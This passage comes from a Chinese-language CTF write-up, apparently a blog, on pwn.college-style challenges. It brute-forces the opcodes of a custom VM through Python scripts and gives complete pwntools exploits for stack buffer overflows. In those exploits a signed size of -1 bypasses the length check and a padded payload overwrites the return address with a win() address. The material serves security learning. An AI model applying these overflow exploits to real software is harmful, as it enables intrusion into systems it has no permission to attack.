class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-title">command</span>= [&#x27;/challenge/babyrev-level-<span class="hljs-number">22</span>-<span class="hljs-number">1</span>&#x27;]<br><br><span class="hljs-class"><span class="hljs-keyword">data</span> = bytearray()</span><br><br><span class="hljs-meta"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-meta">#     file.write(&#x27;&#x27;)</span><br><br><span class="hljs-title">values</span> = [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x40</span>]<br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x30</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> reg0x1 = 0x30</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x08</span>) # i寄存器</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>) # 0x1寄存器</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">i</span>) # 依次改成04 08 10 40测试即可</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br>    print(<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>    try:<br>        res = subprocess.run(command,input=<span class="hljs-class"><span class="hljs-keyword">data</span>,stdout=subprocess.<span class="hljs-type">PIPE</span>, stderr=subprocess.<span class="hljs-type">PIPE</span>,timeout=1)</span><br>    except subprocess.<span class="hljs-type">TimeoutExpired</span>:<br>            print(<span class="hljs-string">&quot;timeout&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>.clear()</span><br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">013002080104010120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">013002080104010120</span><br><span class="hljs-attribute">013002080108010120</span><br><span class="hljs-attribute">013002080110010120</span><br><span class="hljs-attribute">013002080140010120</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">013002080140010120</span><br></code></pre></td></tr></table></figure><p>因此，可以判断出ADD指令和LDM指令在<code>0x04</code>和<code>0x40</code>中。而STM指令和CMP指令在<code>0x08</code>和<code>0x10</code>中。</p><p>进一步区STM和CMP指令需要借助JMP指令。因为CMP+JMP指令会导致跳转，从而超时。但是STM+JMP指令不会导致跳转。所以，CMP+JMP测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-1&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-comment"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-comment">#     file.write(&#x27;&#x27;)</span><br><br>values = [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>]<br>values_2 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values_2:<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x30</span>)<br>        data.append(<span class="hljs-number">0x02</span>)   <span class="hljs-comment"># IMM reg0x1 = 0x30</span><br><br>        data.append(<span class="hljs-number">0x08</span>) <span class="hljs-comment"># arg1 i</span><br>        data.append(<span class="hljs-number">0x08</span>) <span class="hljs-comment"># arg2 i</span><br>        data.append(i) <span class="hljs-comment"># CMP/STM i i</span><br>        data.append(j)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.clear()<br></code></pre></td></tr></table></figure><p>这里对于JMP指令的参数是不知道的，因此也需要循环遍历。所以是双重循环。最后结果如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">hacker<span class="hljs-variable">@reverse</span>-engineering~level22<span class="hljs-number">-1</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>python vm.py <br><span class="hljs-number">013002080808010101010120</span><br><span class="hljs-number">013002080808020101010120</span><br><span class="hljs-number">013002080808040101010120</span><br><span class="hljs-number">013002080808080101010120</span><br><span class="hljs-number">013002080808100101010120</span><br><span class="hljs-number">013002080808200101010120</span><br><span class="hljs-number">013002080808400101010120</span><br><span class="hljs-number">013002080808800101010120</span><br><span class="hljs-number">013002080810010101010120</span><br><span class="hljs-number">013002080810020101010120</span><br><span class="hljs-number">013002080810040101010120</span><br><span class="hljs-number">013002080810080101010120</span><br><span class="hljs-number">013002080810100101010120</span><br><span class="hljs-number">013002080810200101010120</span><br><span class="hljs-number">013002080810400101010120</span><br>timeout <span class="hljs-number">013002080810400101010120</span><br><span class="hljs-number">013002080810800101010120</span><br></code></pre></td></tr></table></figure><p>因此，确定到<code>080810</code>中<code>10</code>是CMP指令。则<code>08</code>是STM指令的opcode。最后总结一下：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">JMP</span>: 01<br><span class="hljs-attribute">IMM</span>: 02<br><span class="hljs-attribute">SYS</span>: 20|open:40exit:01<br><span class="hljs-attribute">STK</span>: 80<br><span class="hljs-attribute">STM</span>: 08<br><span class="hljs-attribute">LDM</span>: 04|40<br><span class="hljs-attribute">ADD</span>: 04|40<br><span class="hljs-attribute">CMP</span>: 10<br><span class="hljs-literal">-</span>------------------------------------<br><span class="hljs-attribute">a</span>: ?<br><span class="hljs-attribute">b</span>: ?<br><span class="hljs-attribute">c</span>: ?<br><span class="hljs-attribute">d</span>: ?<br><span class="hljs-attribute">s</span>: ?<br><span class="hljs-attribute">i</span>: 08<br><span class="hljs-attribute">f</span>: ?<br></code></pre></td></tr></table></figure><p>接下来通过SYS sleep来确定reg_a，因为SYS sleep会休眠reg_a秒。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>command= [<span class="hljs-string">&#x27;/challenge/babyrev-level-22-1&#x27;</span>]<br><br>data = <span class="hljs-built_in">bytearray</span>()<br><br><span class="hljs-comment"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-comment">#     file.write(&#x27;&#x27;)</span><br><br>values = [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x80</span>]<br>values_2 = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> values:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> values_2:<br>        data.append(j)<br>        data.append(<span class="hljs-number">0x10</span>)<br>        data.append(<span class="hljs-number">0x02</span>)   <span class="hljs-comment"># IMM reg j = 0x10</span><br>        <br>        data.append(i)<br>        data.append(<span class="hljs-number">0x1</span>)      <span class="hljs-comment"># sleep | write | read_code | read_mem</span><br>        data.append(<span class="hljs-number">0x20</span>)<br><br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x01</span>)<br>        data.append(<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">print</span>(data.<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">try</span>:<br>            res = subprocess.run(command,<span class="hljs-built_in">input</span>=data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;timeout&quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>        data.clear()<br></code></pre></td></tr></table></figure><p>结果为：<code>timeout 101002020120010120</code>。那么可以知道<code>0x10</code>为reg_a，且sleep的code为<code>0x02</code>。再次汇总：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">JMP:</span> <span class="hljs-number">01</span><br><span class="hljs-symbol">IMM:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">SYS:</span> <span class="hljs-number">20</span>|open:<span class="hljs-number">40</span>exit:<span class="hljs-number">01</span><span class="hljs-keyword">sleep</span>:<span class="hljs-number">02</span><br><span class="hljs-symbol">STK:</span> <span class="hljs-number">80</span><br><span class="hljs-symbol">STM:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">LDM:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">ADD:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">CMP:</span> <span class="hljs-number">10</span><br>-------------------------------------<br><span class="hljs-symbol">a:</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">b:</span> ?<br><span class="hljs-symbol">c:</span> ?<br><span class="hljs-symbol">d:</span> ?<br><span class="hljs-symbol">s:</span> ?<br><span class="hljs-symbol">i:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">f:</span> ?<br></code></pre></td></tr></table></figure><p>接下来可以确定write，因为可以将rax置为<code>0x1</code>这样就会输出在屏幕中了，因此我们可以遍历rcx，因为rcx控制的是输出字符数量，再遍历<code>read | write | read_code</code>。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-title">command</span>= [&#x27;/challenge/babyrev-level-<span class="hljs-number">22</span>-<span class="hljs-number">1</span>&#x27;]<br><span class="hljs-class"><span class="hljs-keyword">data</span> = bytearray()</span><br><br><span class="hljs-meta"># with open(&#x27;res.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="hljs-meta">#     file.write(&#x27;&#x27;)</span><br><br><span class="hljs-title">values</span> = [<span class="hljs-number">0x4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-title">values_2</span> = [<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> values:<br>    for j <span class="hljs-keyword">in</span> values_2:<br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">j</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> c = 0x01</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x10</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> a = 0x01</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">i</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)    # write | read_code | read_mem</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br>        print(<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>        try:<br>            res = subprocess.run(command,input=<span class="hljs-class"><span class="hljs-keyword">data</span>,stdout=subprocess.<span class="hljs-type">PIPE</span>, stderr=subprocess.<span class="hljs-type">PIPE</span>,timeout=1)</span><br>            print(len(res.stdout))<br>        except subprocess.<span class="hljs-type">TimeoutExpired</span>:<br>                print(<span class="hljs-string">&quot;timeout&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.clear()</span><br></code></pre></td></tr></table></figure><p>查看结果，可以找到长度不一致的输入。这个就是我们找到的write和rcx：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">800102100102080120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">010102100102100120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">020102100102100120010120</span><br><span class="hljs-number">1076</span><br><span class="hljs-number">040102100102100120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">200102100102100120010120</span><br><span class="hljs-number">1075</span><br></code></pre></td></tr></table></figure><p>那么可以知道，write是<code>0x10</code>，rcx是<code>0x02</code>。然后read也很简单，写一个exp，并且使用interactive，如果这个interactive一直在等待输入，那么说明是<code>read_memory</code>或者<code>read_code</code>。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babyrev-level-22-1&#x27;, &#x27;b *$rebase(0x2345)&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-22-1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_c = <span class="hljs-number">0x020102</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x100002</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x201020</span>                         <span class="hljs-comment"># read_mem | read_code | other</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_exit = <span class="hljs-number">0x010120</span><br>payload += p32(sys_exit, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-comment"># for i in range(50):</span><br><span class="hljs-comment">#     print(p.readline())</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><p>最终确定，read_mem和read_code是<code>20</code>和<code>08</code>之中的。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">JMP:</span> <span class="hljs-number">01</span><br><span class="hljs-symbol">IMM:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">SYS:</span> <span class="hljs-number">20</span>|open:<span class="hljs-number">04</span>| <span class="hljs-number">40</span>exit:<span class="hljs-number">01</span><span class="hljs-keyword">sleep</span>:<span class="hljs-number">02</span>write:<span class="hljs-number">10</span>read:<span class="hljs-number">08</span>|<span class="hljs-number">20</span><br><span class="hljs-symbol">STK:</span> <span class="hljs-number">80</span><br><span class="hljs-symbol">STM:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">LDM:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">ADD:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">CMP:</span> <span class="hljs-number">10</span><br>-------------------------------------<br><span class="hljs-symbol">a:</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">b:</span> <span class="hljs-number">04</span><br><span class="hljs-symbol">c:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">d:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br><span class="hljs-symbol">s:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br><span class="hljs-symbol">i:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">f:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>最后，即可使用Shellcode的爆破。依次去试出来。</p><p>这里发现了一个错误…因为一开始错误的认为Open是0x40导致后面的exp一直出不来。最后试了一下0x4出来了。因此如果open有问题，那么就也进行一个尝试即可。</p><h3 id="Intermediate-Memory-Errors"><a href="#Intermediate-Memory-Errors" class="headerlink" title="Intermediate Memory Errors"></a>Intermediate Memory Errors</h3><blockquote><p>前面的level应该是太简单而删除了。直接从Level4.0开始的。</p></blockquote><h4 id="level4-0-1"><a href="#level4-0-1" class="headerlink" title="level4.0"></a>level4.0</h4><p>直接运行这个level后看到： <strong>stack pointer points to 0x7ffe1d045370</strong>。也就是<code>rsp</code>指向<code>0x7ffe1d045370</code></p><p><strong>base pointer points to 0x7ffe1d045400</strong>。 说明<code>rbp</code>指向<code>0x7ffe1d045400</code></p><p><strong>he input buffer begins at 0x7ffe1d0453a0</strong>。 说明输入从<code>0x7ffe1d0453a0</code>开始</p><p>起始，都不重要。它给的信息确实很多，告诉我们总共需要覆盖112个字节的数据，然后其中104个字节是填充，后面8个字节是返回地址。通过IDA直接能够拿到win()函数的偏移地址。但是IDA里反汇编发现大于82是不行的，而且输入是以<code>%i</code>进行的，可以尝试输入-1。也就是<code>0xffffffff</code>。可以通过栈看到的。然后就能发送超过82字节的数据。最后能够发现win函数的地址（不管是题目的tips还是IDA都能看到），这样exp一下就出来了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-0&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-4-0&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>size = <span class="hljs-string">b&#x27;-1&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">104</span><br>payload += p64(<span class="hljs-number">0x4016a9</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level4-1-1"><a href="#level4-1-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题现在就是不会打印出栈的信息了。可以通过gdb调试查看栈的信息。</p><p>因为都是带符号的，所以win()函数在哪可以通过b win知道。然后cyclic 256，生成的串直接给目标程序。size还是-1。然后发生段错误的时候，gdb能够知道ret的是哪个子串。最后通过<code>cyclic -l &#39;jaabkaab&#39;</code>，知道padding的长度。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-1&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-4-1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>size = <span class="hljs-string">b&#x27;-1&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">136</span><br>payload += p64(<span class="hljs-number">0x401685</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure><h4 id="level5-0-1"><a href="#level5-0-1" class="headerlink" title="level5.0"></a>level5.0</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">In</span> [<span class="hljs-number">1</span>]: <span class="hljs-number">0xFFFFFFFF</span>&amp;(<span class="hljs-number">0x7ffffffb</span> *  <span class="hljs-number">0x7ffffffc</span>)<br><span class="hljs-keyword">Out</span>[<span class="hljs-number">1</span>]: <span class="hljs-number">2147483668</span><br><br><span class="hljs-keyword">In</span> [<span class="hljs-number">2</span>]: <span class="hljs-number">0xFFFFFFFF</span>&amp;(<span class="hljs-number">0x7ffffffb</span> *  <span class="hljs-number">0x7ffffffd</span>)<br><span class="hljs-keyword">Out</span>[<span class="hljs-number">2</span>]: <span class="hljs-number">15</span><br><br><span class="hljs-keyword">In</span> [<span class="hljs-number">3</span>]: <span class="hljs-number">0x7ffffffb</span> *  